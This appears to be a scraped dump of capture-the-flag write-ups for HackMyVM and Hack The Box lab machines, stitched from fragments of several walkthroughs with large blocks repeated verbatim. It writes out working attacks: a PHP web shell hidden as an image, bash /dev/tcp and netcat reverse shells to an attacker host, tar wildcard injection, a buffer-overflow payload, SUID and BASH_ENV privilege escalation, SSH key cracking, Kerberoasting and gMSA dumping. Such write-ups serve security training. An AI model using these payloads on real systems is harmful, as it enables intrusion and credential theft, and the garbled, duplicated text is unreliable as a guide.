staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection. Now, /usr/bin/bash has the SUID bit set.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain.

In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

Now we can try executing commands on the server through the uploaded file’s URL.\nWe execute a Reverse Shell and access the machine.\nhttp://environment.htb/storage/files/cmd.php?cmd=nc -c /bin/bash 10.10.14.32 4444 Privilege escalation to Hish If we navigate to hish’s folder, we can read the User Flag. We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

Since sudo preserves this variable, we can point it to our own script, and when we run sudo /usr/bin/systeminfo, Bash will execute our script with root privileges.\nWe create a Bash script in Hish’s home directory with the following content:\n#!/bin/bash\r/bin/bash Then we assign the BASH_ENV variable pointing to our script:\nexport BASH_ENV=/home/hish/root.sh When we execute sudo /usr/bin/systeminfo, Bash will automatically load our script, and we obtain a shell with root privileges.\nWe get the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/environment/","summary":"Difficulty: Medium 🟠","title":"Environment - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/family/","summary":"Difficulty: Medium 🟠","title":"Family - HackMyVM"},{"content":"\rMachine Link\nWe can see that when we open the machine it tells us its IP:\nSo knowing that the IP of the machine is 192.168.18.28, we are going to do a simple NMAP scan to see what ports it has open and what service they are running:\nNMAP simple scan\rWe can see that this machine hosts a web server on port 80 and that port 22 (ssh) is open.\nThis is what we see when we open the web server:\nIt tells us not to think too much.

Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain.

In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

Now we can try executing commands on the server through the uploaded file’s URL.\nWe execute a Reverse Shell and access the machine.\nhttp://environment.htb/storage/files/cmd.php?cmd=nc -c /bin/bash 10.10.14.32 4444 Privilege escalation to Hish If we navigate to hish’s folder, we can read the User Flag. We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

